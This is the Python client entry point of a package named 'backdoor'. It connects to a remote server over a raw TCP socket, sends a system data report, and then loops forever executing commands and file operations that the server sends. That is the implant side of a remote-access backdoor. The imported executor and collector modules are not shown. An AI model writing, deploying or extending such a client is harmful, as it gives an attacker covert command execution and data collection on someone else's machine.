import socket

from backdoor.command.executor import CommandExecutor
from backdoor.files.io import FileReader, FileWriter
from backdoor.files.processor import FileProcessor
from backdoor.messages.exchange.client import ClientExchangeMapper
from backdoor.messages.messenger import SocketMessenger
from backdoor.messages.protocol import SocketProtocol
from backdoor.models.server import ServerModel
from backdoor.report.systemreport import SystemDataCollector
from backdoor.serialization.jsonserializer import JsonSerializer


class Client:

    def __init__(
        self,
        messenger: SocketMessenger,
        exchanger: ClientExchangeMapper,
        host: str = "localhost",
        port: int = 4567,
    ) -> None:
        self.host = host
        self.port = port
        self.messenger = messenger
        self.exchanger = exchanger
        self.server: ServerModel

    def run(self) -> None:
        self.__establish_connection()
        self.__send_system_report()

        while True:
            self.exchanger.exchange(self.server)

    def __send_system_report(self) -> None:
        collector = SystemDataCollector()
        report = collector.collect_data()
        self.messenger.send(self.server.sock, report)

    def __establish_connection(self) -> None:
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.connect((self.host, self.port))
        self.server = ServerModel(host=self.host, port=self.port, sock=server)


def main() -> None:
    protocol = SocketProtocol()
    serializer = JsonSerializer()
    messenger = SocketMessenger(protocol, serializer)
    file_reader = FileReader()
    file_writer = FileWriter()
    file_processor = FileProcessor(file_writer, file_reader)
    executor = CommandExecutor(file_processor)
    exchanger = ClientExchangeMapper(messenger, executor)
    client = Client(messenger, exchanger)

    client.run()


if __name__ == "__main__":
    main()
